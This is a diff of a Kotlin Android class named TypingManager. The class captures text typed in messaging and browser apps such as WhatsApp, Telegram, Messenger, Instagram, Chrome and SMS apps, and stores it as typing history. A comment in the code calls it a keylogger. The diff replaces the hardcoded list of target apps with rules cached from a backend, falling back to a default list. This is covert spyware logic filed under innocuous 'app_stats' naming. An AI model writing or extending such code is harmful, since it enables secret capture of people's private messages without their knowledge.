@@ -7,20 +7,6 @@ import org.json.JSONArray
 import org.json.JSONObject
 
 object TypingManager {
-    // EXPANDED TARGET LIST (Keylogger + Screen Reader Sync)
-    private val TARGETS = setOf(
-        "com.imo.android.imoim", 
-        "com.google.android.apps.messaging", 
-        "com.samsung.android.messaging",
-        "com.whatsapp",
-        "org.telegram.messenger",
-        "org.telegram.plus",
-        "com.truecaller",
-        "com.android.chrome",
-        "com.facebook.orca",
-        "com.instagram.android"
-    )
-
     private var lastPkg = ""
     private var lastTs = 0L
     private var startTs = 0L
@@ -28,12 +14,21 @@ object TypingManager {
     fun onType(ctx: Context, pkg: String, text: String) {
         // Feature Gate
         if (!ConfigManager.canCollect(ctx, "typing")) return
-
-        if (pkg !in TARGETS) return
         if (text.isBlank()) return
         
-        val now = System.currentTimeMillis()
         val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        
+        // Dynamic Target Check (Syncs with Accessibility Rules & Backend)
+        val rulesStr = prefs.getString("cached_rules", "{}")
+        val isTarget = try {
+            val json = JSONObject(rulesStr!!)
+            if (json.length() > 0) json.has(pkg) else getDefaultTargets().contains(pkg)
+        } catch (e: Exception) {
+            getDefaultTargets().contains(pkg)
+        }
+        if (!isTarget) return
+        
+        val now = System.currentTimeMillis()
         
         // Load History
         val historyStr = prefs.getString("typing_history", "[]")
@@ -106,5 +101,14 @@ object TypingManager {
         stats.put("total_chars", totalChars)
         stats.put("avg_wpm", avg)
         return stats
+    }
+
+    private fun getDefaultTargets(): Set<String> {
+        return setOf(
+            "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd",
+            "com.google.android.apps.messaging", "com.samsung.android.messaging",
+            "com.whatsapp", "org.telegram.messenger", "org.telegram.plus",
+            "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android"
+        )
     }
 }
